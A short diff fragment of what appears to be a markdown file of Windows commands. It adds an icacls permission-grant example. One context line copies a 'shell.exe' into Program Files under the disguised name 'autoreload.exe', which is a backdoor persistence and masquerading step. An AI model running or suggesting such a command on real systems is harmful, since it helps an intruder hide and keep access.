@@ -40,4 +40,6 @@ dir /s/b *.log
 copy C:\Users\Public\shell.exe "C:\Program Files\Common Files\Services\autoreload.exe" /Y
 ```
 
-
+```
+icacls "C:\Path\To\Your\File.txt" /grant:r "Username:(R)"
+```
